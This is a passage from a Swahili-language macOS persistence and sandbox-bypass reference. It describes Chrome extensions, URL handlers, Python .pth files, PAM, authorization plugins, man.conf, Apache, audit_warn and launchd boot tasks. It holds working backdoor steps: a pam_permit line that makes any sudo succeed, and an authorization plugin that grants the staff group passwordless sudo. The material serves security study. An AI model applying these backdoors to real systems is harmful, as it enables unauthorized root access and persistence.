Hizi ni njia mbili tofauti za usakinishaji. [Nyaraka za Chrome kuhusu usakinishaji wa nje](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) zinasema kuwa **watumiaji wa Windows na macOS lazima wathibitishe na kuwezesha** extension inayotolewa kupitia faili ya *External Extensions*; haiendeshwi kwa sababu tu faili hiyo ya JSON imeandikwa. Kwa usakinishaji wa watumiaji wote kwenye macOS, Chrome pia huhitaji faili ya external-extension ilindwe dhidi ya marekebisho yanayofanywa na wasio na ruhusa za juu. Sera ya `ExtensionInstallForcelist` au `ExtensionSettings` inayosimamiwa inaweza kusakinisha na kubandika extension bila mwingiliano huo wa mtumiaji; [mwongozo wa Google wa sera za Mac](https://support.google.com/chrome/a/answer/7517624) unaeleza usanidi unaosimamiwa na kusema kuwa mtumiaji hawezi kuondoa extension zilizosakinishwa kwa lazima. Hii ni njia ya kusambaza sera, si njia ya mkato ya `defaults write` kwa kila mtumiaji.<sup>[[49]](#references)</sup>

> [!WARNING]
> Kwenye macOS, manifest ya JSON ya *External Extensions* lazima ielekeze kwenye URL ya masasisho ya **Chrome Web Store**, si CRX ya ndani. Usambazaji wa sera inayosimamiwa una masharti yake ya biashara na huenda ukaruhusu URL ya masasisho inayosimamiwa na mwenyewe. Kwa extension ya ndani ambayo haijafungwa kwenye kifurushi, kwenye wasifu wa majaribio, swichi ya Chrome ya developer mode `--load-extension=/path` ni utaratibu tofauti na haifanyi faili ya JSON ya External Extensions ijitekeleze yenyewe. Usichukulie kuandika kwenye `Secure Preferences` kuwa sawa na mojawapo ya njia rasmi za usajili.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Anzisha Chrome katika akaunti hiyo ya muda na uangalie kidokezo cha kuwezesha; tabia yenyewe ya extension ndiyo PoC ya utekelezaji mara mtumiaji anapokubali. Baada ya jaribio, ondoa manifest na uzime/usanidue extension katika wasifu huo. Njia hii **haikujaribiwa** katika wasifu wa Chrome uliokuwa ukitumika kwenye Mac ya utafiti. Njia ya managed-policy pia haikutumika hapo.

Force-install na External Extensions hurejelea IDs za extension za **Chrome Web Store**; kwa mbinu ya kiwango cha chini ya kuingiza extension ya ndani kimyakimya kwa kuhariri `Secure Preferences` ya wasifu iliyosainiwa kwa HMAC, na matumizi mabaya mengine ya michakato ya Chromium, angalia:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### Vishughulikiaji vya URL Scheme na Aina za Faili (LaunchServices)

Maelezo: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Hufaa kwa bypass ya sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Kichochezi ni mwathiriwa kubofya kiungo (kwa mfano, katika Chrome/Brave/Safari) au kufungua faili ya aina iliyosajiliwa
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `Info.plist` ya app bundle inayotangaza **`CFBundleURLTypes`/`CFBundleURLSchemes`** (custom URL scheme) au **`CFBundleDocumentTypes`** (kiendelezi cha faili/UTI)
- Chaguo-msingi zinazotumika kwa mtumiaji mmoja mmoja zinaweza kuonekana katika **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (array ya `LSHandlers`). API inayoungwa mkono na Apple ya kuchagua chaguo-msingi la URL scheme ni `LSSetDefaultHandlerForURLScheme`; kuandika plist hiyo moja kwa moja si njia iliyowekwa rasmi ya usajili au kusasisha akiba.

#### Maelezo na Unyonyaji

Launch Services hupata madai ya URL scheme na hati kutoka kwenye `Info.plist` ya app iliyosajiliwa. [Mwongozo wa usajili wa Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) unasema usajili unaweza kutokea Finder inapoigundua app, wakati wa kuwasha au kuingia, au kupitia API ya usajili iliyo wazi; kuweka app mahali fulani pekee hakuhakikishi kichochezi cha papo hapo. Baada ya usajili, kufungua URL au hati inayolingana kunaweza kuzindua app iliyochaguliwa kuwa handler, kulingana na chaguo la mtumiaji la handler-msingi na ukaguzi wa kawaida wa uzinduzi wa macOS. API inayoungwa mkono `LSSetDefaultHandlerForURLScheme` hubadilisha handler ya URL inayopendelewa na mtumiaji; haisababishi app mpya iliyowekwa kujiendesha moja kwa moja.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Hakuna app iliyosajiliwa wala upendeleo wa handler uliobadilishwa kwenye Mac ya utafiti yenye macOS 26.5.2. Ili kujaribu handler halisi, tumia akaunti ya mtumiaji inayoweza kutupwa, sajili app inayoweka alama pekee yenye scheme ya kipekee, iite URL yake, kisha ondoa app hiyo na usajili wake.

Kwa maelezo ya kina kuhusu kuorodhesha/kunyanyasa handlers za viendelezi vya faili na URL-scheme, angalia:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Faili za uanzishaji wa Python (`.pth` / `usercustomize` / `sitecustomize`)

Maelezo: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Hufaa kwa kubypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Hutekelezwa interpreter husika ya Python inapoanza ikiwa directory hiyo ya site imewezeshwa; kichochezi hiki hakitumiki kwa ujumla katika virtual environments, builds za Python, au startup flags zote
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Hutekelezwa kwa privileges/TCC za process yoyote iliyoanzisha interpreter

#### Mahali

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Haihitaji root (inaweza kuandikwa na mtumiaji)
  - **Kichochezi**: interpreter ya Python build hiyo inapoanza huku user site yake ikiwa imewezeshwa; module ya `site` huchakata faili za `.pth` katika directories za site zinazotumika
- **`<user-site>/usercustomize.py`**
  - Haihitaji root
  - **Kichochezi**: interpreter inapoanza huku user site ikiwa imewezeshwa (huingizwa kiotomatiki na `site`)
- **`<prefix>/site-packages/sitecustomize.py`** (kwa mfano, `/opt/homebrew/lib/python3.13/site-packages/`, au system paths)
  - Huenda ikahitaji root/admin kutegemea mahali interpreter ilipo
  - **Kichochezi**: interpreter inapoanza ikiwa na directory hiyo ya site

#### Maelezo na Unyonyaji

Python kwa kawaida huingiza `site` wakati wa kuanza na kuchanganua directories zake za `site-packages` zinazotumika kutafuta faili za `.pth`. Mbali na kuongeza paths, mstari wa `.pth` unaoanza na `import ` hutekeleza Python code hata kama module iliyotajwa haitumiki kwa njia nyingine yoyote. Python pia hujaribu kuingiza `sitecustomize` na, **wakati user site imewezeshwa**, `usercustomize`.<sup>[[56]](#references)</sup> Kichochezi ni interpreter kuanza tena baadaye na kuona directory iliyobadilishwa. `-S` huzima uchakataji wa `site`; `-s`, `-I`, au `PYTHONNOUSERSITE` huzima variants za **user-site**. Kwa kawaida `-I` haizimi `sitecustomize` ya global. Virtual environments pia zinaweza kutenga user site. Angalia `python3 -m site` kwa interpreter husika.

PoC ifuatayo iliendeshwa kwenye macOS 26.5.2. `PYTHONUSERBASE` huhamisha user site hadi kwenye directory ya muda kwa jaribio hili; hakuna user site halisi inayobadilishwa:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Alama zote mbili zilionekana. Kurudia kwa kutumia `-s`, `-I`, au `-S` kulizuia alama zote mbili za **user-site** katika jaribio hili. `sitecustomize` katika saraka ya global site haikujaribiwa.

## Root Sandbox Bypass

> [!TIP]
> Hapa unaweza kupata maeneo ya kuanzia yanayofaa kwa **sandbox bypass**, yanayokuwezesha kutekeleza kitu kwa urahisi kwa **kukikiandika kwenye faili** ukiwa **root** na/au ukihitaji **hali nyingine zisizo za kawaida.**

### Periodic

> [!CAUTION]
> **Utaratibu wa kihistoria:** Kwenye mashine ya majaribio ya macOS 26.5.2, `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic`, na launch daemons za `com.apple.periodic-*` hazipo. Usidhani kwamba kuunda `/etc/periodic` kwenye mfumo wa sasa kutapanga maudhui yake yaendeshwe. Kabla ya kutumia mfano ulio hapa chini, hakikisha kwamba command na scheduler iliyowezeshwa zipo kwenye toleo lengwa.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Inafaa kwa sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Inahitaji root
  - **Kichochezi**: Wakati wake ukifika
- `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local`
  - Inahitaji root
  - **Kichochezi**: Wakati wake ukifika

#### Maelezo na Utumiaji wa Exploit

Katika matoleo ya zamani, scripts za periodic (**`/etc/periodic`**) zilipangwa kuendeshwa na **launch daemons** katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Kuanzia macOS Big Sur 11.5, periodic runner iliendesha scripts katika saraka za periodic kama **mmiliki wa kila faili**, na hivyo kufunga njia ya awali ya privilege escalation.<sup>[[27]](#references)</sup> Commands na orodha za saraka zilizo hapa chini ni matokeo ya kihistoria, si matokeo ya jaribio la macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Kuna hati nyingine zinazoendeshwa mara kwa mara, zilizoonyeshwa katika **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Kwenye mifumo ya zamani ambako `periodic` na launch daemons zake zimewekwa na kuwezeshwa, `/etc/daily.local`, `/etc/weekly.local`, na `/etc/monthly.local` zilikuwa njia za ziada za utekelezaji. Ukaguzi usio na madhara wa kusoma pekee ni:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Kanuni inayotegemea mmiliki ilitumika kwa scripts zilizo moja kwa moja ndani ya directories za periodic. Wrapper ya kihistoria ya `999.local` ilikuwa ikiendesha `/etc/daily.local`, `/etc/weekly.local`, au `/etc/monthly.local` bila ukaguzi huo wa umiliki; scheduler ilipoendeshwa kama root, faili hizi za ndani ziliendeshwa kama root. Tofauti hii na mabadiliko ya Big Sur 11.5 zimeandikwa katika [utafiti wa awali](https://theevilbit.github.io/beyond/beyond_0019/). Hakuna mojawapo ya paths hizi inayopaswa kuchukuliwa kuwa inatumika wakati `periodic` haipo.

### PAM

Maelezo: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Maelezo: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- Root inahitajika kila wakati

#### Maelezo na Exploitation

Kwa kuwa PAM inalenga zaidi **persistence** na malware kuliko utekelezaji rahisi ndani ya macOS, blogu hii haitatoa maelezo ya kina; **soma maelezo ili kuelewa vyema mbinu hii**.<sup>[[28]](#references)</sup>

Angalia modules za PAM kwa kutumia:

```bash
ls -l /etc/pam.d
```

Mbinu ya persistence/privilege escalation inayotumia vibaya PAM ni rahisi kama kurekebisha module /etc/pam.d/sudo na kuongeza mwanzoni mstari huu:

```bash
auth       sufficient     pam_permit.so
```

Kwa hiyo **itaonekana kama** kitu kama hiki:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Na kwa hivyo jaribio lolote la kutumia **`sudo` litafaulu**.

> [!CAUTION]
> Kumbuka kwamba saraka hii inalindwa na TCC, kwa hivyo kuna uwezekano mkubwa kwamba mtumiaji ataombwa ruhusa ya kuifikia.

Mfano mwingine mzuri ni su, ambapo unaweza kuona kwamba inawezekana pia kutoa vigezo kwa modules za PAM (na pia unaweza kuweka backdoor kwenye faili hii):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Plugin za Uidhinishaji

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Hufaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root na kufanya usanidi wa ziada
- TCC bypass: ???

#### Mahali

- `/Library/Security/SecurityAgentPlugins/`
  - Root inahitajika
  - Pia unahitaji kusanidi authorization database ili itumie plugin

#### Maelezo na Exploitation

Unaweza kuunda authorization plugin itakayoendeshwa mtumiaji anapoingia ili kudumisha persistence. Kwa maelezo zaidi kuhusu jinsi ya kuunda mojawapo ya plugin hizi, angalia writeup zilizotangulia (na uwe mwangalifu, ikiwa imeandikwa vibaya inaweza kukufungia nje na utahitaji kusafisha Mac yako ukiwa kwenye recovery mode).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Hamisha** kifurushi hadi eneo kitakapopakiwa:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Hatimaye ongeza **sheria** ya kupakia Plugin:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** itaujulisha mfumo wa uidhinishaji kwamba utahitaji **kuita utaratibu wa nje kwa ajili ya uidhinishaji**. Aidha, **`privileged`** itasababisha utekelezwe na root.

Ianzishe kwa:

```bash
security authorize com.asdf.asdf
```

Na kisha **staff group inapaswa kuwa na ufikiaji wa sudo** (soma `/etc/sudoers` ili kuthibitisha).

### Man.conf

Maelezo: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Inafaa kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root na mtumiaji lazima atumie man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/private/etc/man.conf`**
  - Inahitaji root
  - **`/private/etc/man.conf`**: Kila mara man inapotumika

#### Maelezo na Exploit

Faili ya usanidi **`/private/etc/man.conf`** huonyesha binary/script itakayotumika kufungua faili za nyaraka za man. Kwa hiyo, njia ya executable inaweza kubadilishwa ili kila mtumiaji anapotumia man kusoma nyaraka fulani, backdoor iendeshwe.<sup>[[31]](#references)</sup>

Kwa mfano, weka yafuatayo kwenye **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

Kisha unda `/tmp/view` kama:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Inafaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root na apache lazima iwe inaendeshwa
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd haina entitlements

#### Mahali

- **`/etc/apache2/httpd.conf`**
  - Root inahitajika
  - Kichochezi: Apache2 inapoanzishwa

#### Maelezo na Exploit

Unaweza kubainisha kwenye `/etc/apache2/httpd.conf` kupakia module kwa kuongeza mstari kama huu:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Kwa njia hii, moduli yako iliyokusanywa itapakiwa na Apache. Jambo pekee ni kwamba unahitaji **kuitia saini kwa kutumia cheti halali cha Apple**, au **kuongeza cheti kipya kinachoaminika** kwenye mfumo na **kuitia saini** kwa kutumia cheti hicho.

Kisha, ikihitajika, ili kuhakikisha kuwa seva itaanzishwa, unaweza kutekeleza:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Mfano wa msimbo wa Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Mfumo wa ukaguzi wa BSM

Maelezo: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Hufaa kwa kukwepa sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Lakini unahitaji kuwa root, auditd iwe inaendeshwa na kusababisha onyo
- Kukwepa TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/etc/security/audit_warn`**
  - Root inahitajika
  - **Kichochezi**: Wakati auditd inapotambua onyo

#### Maelezo na Exploit

Kila wakati auditd inapotambua onyo, script **`/etc/security/audit_warn`** **inatekelezwa**. Kwa hiyo unaweza kuongeza payload yako humo.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Unaweza kulazimisha onyo kwa kutumia `sudo audit -n`.

### Vipengee vya Kuanzisha

> [!CAUTION] > **Hii imeacha kutumika, kwa hivyo hakuna kitu kinachopaswa kupatikana kwenye saraka hizo.**

**StartupItem** ni saraka inayopaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Baada ya saraka hii kuundwa, lazima iwe na faili mbili mahususi:

1. **rc script**: Hati ya shell inayoendeshwa wakati wa kuwasha mfumo.
2. **Faili ya plist**, inayoitwa hasa `StartupParameters.plist`, ambayo ina mipangilio mbalimbali ya usanidi.

Hakikisha kwamba rc script na faili ya `StartupParameters.plist` zimewekwa ipasavyo ndani ya saraka ya **StartupItem** ili mchakato wa kuwasha mfumo uzitambue na kuzitumia.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Siwezi kupata kipengele hiki kwenye macOS yangu, kwa hivyo angalia writeup kwa maelezo zaidi

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Iliyoanzishwa na Apple, **emond** ni utaratibu wa kurekodi kumbukumbu unaoonekana kuwa haujaendelezwa vya kutosha au labda umeachwa, lakini bado unapatikana. Ingawa haimfaidi sana msimamizi wa Mac, huduma hii isiyojulikana sana inaweza kutumiwa na watendaji tishio kama njia fiche ya kudumisha uwepo, na huenda isionekane kwa wasimamizi wengi wa macOS.<sup>[[34]](#references)</sup>

Kwa wanaojua kuwa ipo, kutambua matumizi yoyote hasidi ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa huduma hii hutafuta scripts za kutekeleza kwenye saraka moja. Ili kukagua hili, unaweza kutumia amri ifuatayo:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Mahali

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Inahitaji root
  - **Kichochezi**: Ukiwa na XQuartz

#### Maelezo na Exploit

XQuartz **haijasakinishwa tena kwenye macOS**, kwa hivyo ukitaka maelezo zaidi angalia writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Kusakinisha kext ni jambo gumu sana, hata ukiwa root, kwa hivyo hii haichukuliwi kuwa mbinu inayotekelezeka ya kutoroka sandbox au kudumisha ufikiaji isipokuwa uwe na exploit.

#### Mahali

Ili kusakinisha KEXT kama kipengee cha kuanzisha, inahitaji **kusakinishwa katika mojawapo ya maeneo yafuatayo**:

- `/System/Library/Extensions`
  - Faili za KEXT zilizojengwa ndani ya mfumo wa uendeshaji wa OS X.
- `/Library/Extensions`
  - Faili za KEXT zilizosakinishwa na programu za wahusika wengine

Unaweza kuorodhesha faili za kext zilizopakiwa kwa sasa kwa kutumia:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Kwa maelezo zaidi kuhusu [**kernel extensions, angalia sehemu hii**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Maelezo: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Mahali

- **`/usr/local/bin/amstoold`**
  - Huhitaji ruhusa za Root

#### Maelezo na Exploitation

Inaonekana `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilikuwa ikitumia binary hii huku ikifichua huduma ya XPC... tatizo ni kwamba binary hiyo haikuwepo, kwa hivyo ungeweza kuweka kitu hapo, na huduma ya XPC ilipoitwa, binary yako ingeendeshwa.<sup>[[35]](#references)</sup>

Siwezi tena kuipata kwenye macOS yangu.

### ~~xsanctl~~

Maelezo: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Mahali

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Huhitaji ruhusa za Root
  - **Kichochezi**: Huduma inapoendeshwa (mara chache)

#### Maelezo na exploit

Inaonekana si kawaida sana kuendesha script hii, na sikuweza hata kuipata kwenye macOS yangu. Kwa hivyo, ukitaka maelezo zaidi, angalia maelezo haya.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Hii haifanyi kazi katika matoleo ya kisasa ya MacOS**

Pia inawezekana kuweka hapa **amri zitakazoendeshwa wakati wa kuwasha.** Mfano wa script ya kawaida ya rc.common:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Kazi za Boot za launchd

Maelezo: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Inafaa kwa kukwepa sandbox: [🔴](https://emojipedia.org/large-red-circle) (inahitajika root)
- Inahitaji root, pamoja na **SIP bypass** au ruhusa ya **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, kutegemea njia

#### Mahali

`launchd` hujumuisha plist katika sehemu yake ya **`__TEXT,__config`** inayoelezea "boot tasks" za mapema. Skripti/binari kadhaa za marejeleo ambazo kwa chaguo-msingi **hazipo** na mshambuliaji anaweza kuziunda:

- Seti ya SIP-bypass: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Seti ya TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` huwa tayari ipo kwenye Sequoia+ pekee)

#### Maelezo na Unyonyaji

Dump jedwali la kazi zilizojumuishwa ili kuona faili ambazo `launchd` itaendesha na funguo zinazotumika (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Kutengeneza mojawapo ya faili zilizorejelewa (k.m. `/etc/rc.server`) husababisha `launchd` kulitekeleza kwenye reboot inayofuata ya userspace. Maingizo muhimu zaidi yanazuiwa na SIP au yanahitaji ruhusa za TCC SysAdminFiles/Full Disk Access, kwa hiyo hii ni mbinu ya kiwango cha root inayoanzishwa na reboot.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

